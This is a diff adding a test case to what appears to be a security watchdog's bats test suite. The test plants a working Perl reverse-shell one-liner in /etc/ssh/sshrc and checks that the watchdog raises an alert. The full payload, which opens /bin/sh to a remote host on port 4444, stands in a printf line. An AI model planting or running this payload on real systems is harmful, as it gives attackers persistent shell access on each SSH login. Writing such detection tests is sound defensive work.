@@ -265,3 +265,20 @@ seed_benign() {
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (perl reverse-shell variant — sister axis to python on sshrc surface)" {
+    # Sister to the python -c interpreter-rev-shell INVARIANT
+    # just above + many other watchdog's perl rev-shell axes.
+    # Perl is the OTHER interpreter universally present on Linux
+    # systems (often required by base packages). An attacker may
+    # swap python→perl to dodge a python-only detector. Locks
+    # the perl axis on the per-SSH-login exec surface (T1546 —
+    # /etc/ssh/sshrc executes AS THE LOGGING-IN USER on every
+    # SSH session).
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '# sshrc\nperl -e "use Socket;\\$i=\\\"1.1.1.1\\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");exec(\\\"/bin/sh -i\\\");"\n' > "${SSHRC}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
